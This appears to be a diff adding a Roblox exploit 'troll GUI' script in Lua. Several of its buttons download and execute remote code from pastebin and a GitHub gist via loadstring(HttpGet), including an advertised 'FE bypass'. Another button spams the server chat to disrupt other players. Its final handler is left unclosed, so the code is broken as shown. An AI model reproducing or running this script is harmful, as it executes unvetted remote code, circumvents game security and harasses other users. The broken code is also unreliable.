@@ -1,0 +1,123 @@
+print("4NN1 TROLL GUI xDDD")
+
+local ScreenGui = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local ImageLabel = Instance.new("ImageLabel")
+local Fedora = Instance.new("TextButton")
+local Lag = Instance.new("TextButton")
+local Energize = Instance.new("TextButton")
+local Energize_2 = Instance.new("TextButton")
+local TextLabel = Instance.new("TextLabel")
+
+--Properties:
+
+ScreenGui.Parent = game.CoreGui
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+Frame.Parent = ScreenGui
+Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Frame.BorderSizePixel = 3
+Frame.Position = UDim2.new(0.210592151, 0, 0.158402205, 0)
+Frame.Size = UDim2.new(0, 318, 0, 290)
+Frame.Active = true
+Frame.Draggable = true
+
+ImageLabel.Parent = Frame
+ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ImageLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ImageLabel.BorderSizePixel = 0
+ImageLabel.Position = UDim2.new(0, 0, 0.168965518, 0)
+ImageLabel.Size = UDim2.new(0, 318, 0, 241)
+ImageLabel.Image = "http://www.roblox.com/asset/?id=15937925081"
+ImageLabel.ImageTransparency = 0
+
+Fedora.Name = "Fedora"
+Fedora.Parent = ImageLabel
+Fedora.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Fedora.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Fedora.Position = UDim2.new(0.0440251566, 0, 0.0995850638, 0)
+Fedora.Size = UDim2.new(0, 107, 0, 50)
+Fedora.Font = Enum.Font.SourceSans
+Fedora.Text = "Fedora Admin"
+Fedora.TextColor3 = Color3.fromRGB(0, 0, 0)
+Fedora.TextScaled = true
+Fedora.TextSize = 14.000
+Fedora.TextWrapped = true
+Fedora.MouseButton1Down:Connect(function()
+	loadstring(game:HttpGet("https://pastebin.com/raw/y06bzQuv",true))()
+end)
+
+Lag.Name = "Lag"
+Lag.Parent = ImageLabel
+Lag.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Lag.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Lag.Position = UDim2.new(0.628930807, 0, 0.0995850638, 0)
+Lag.Size = UDim2.new(0, 107, 0, 50)
+Lag.Font = Enum.Font.SourceSans
+Lag.Text = "Chat Lag"
+Lag.TextColor3 = Color3.fromRGB(0, 0, 0)
+Lag.TextScaled = true
+Lag.TextSize = 14.000
+Lag.TextWrapped = true
+Lag.MouseButton1Down:Connect(function()
+	-- Made By Zerparoo
+
+	local AmountOfMessages = 3
+	local SafeMode = false
+	local SafemodeWaitTime = 4
+
+	if SafeMode then
+		game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("TEAM C00LKIDD IS HERE!!12", "All")
+		wait(SafemodeWaitTime)
+		game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("TEAM C00LKIDD IS HERE!!12", "All")
+		wait(SafemodeWaitTime)
+		game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("TEAM C00LKIDD IS HERE!!12", "All")
+	else
+		game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("TEAM C00LKIDD IS HERE!!12", "All")
+		game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("TEAM C00LKIDD IS HERE!!12", "All")
+		game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("TEAM C00LKIDD IS HERE!!12", "All")
+	end
+end)
+
+Energize.Name = "Energize"
+Energize.Parent = ImageLabel
+Energize.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Energize.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Energize.Position = UDim2.new(0.0440251566, 0, 0.601659775, 0)
+Energize.Size = UDim2.new(0, 107, 0, 50)
+Energize.Font = Enum.Font.SourceSans
+Energize.Text = "c00lgui V2.3"
+Energize.TextColor3 = Color3.fromRGB(0, 0, 0)
+Energize.TextScaled = true
+Energize.TextSize = 14.000
+Energize.TextWrapped = true
+Energize.MouseButton1Down:Connect(function()
+	loadstring(game:HttpGet("https://gist.githubusercontent.com/jointeamck/28a342b097091c2f0fac3f7ad03ff631/raw/607936d45e6b8a6ff6ceefe07081302159d8f6cc/c00lgui%2520v2.3%2520deluxe", true))()
+end)
+
+Energize_2.Name = "Energize"
+Energize_2.Parent = ImageLabel
+Energize_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Energize_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Energize_2.Position = UDim2.new(0.628930807, 0, 0.601659775, 0)
+Energize_2.Size = UDim2.new(0, 107, 0, 50)
+Energize_2.Font = Enum.Font.SourceSans
+Energize_2.Text = "FE BYPASS GUI BY JO1TAR0"
+Energize_2.TextColor3 = Color3.fromRGB(0, 0, 0)
+Energize_2.TextScaled = true
+Energize_2.TextSize = 14.000
+Energize_2.TextWrapped = true
+Energize_2.MouseButton1Down:Connect(function()
+	loadstring(game:HttpGet("https://pastebin.com/raw/Sk7R1p8N"))();
+
+TextLabel.Parent = Frame
+TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.BackgroundTransparency = 1.000
+TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel.BorderSizePixel = 0
+TextLabel.Size = UDim2.new(0, 318, 0, 50)
+TextLabel.Font = Enum.Font.SourceSans
+TextLabel.Text = "c00lkidd Troll Gui"
+TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel.TextSize = 27.00
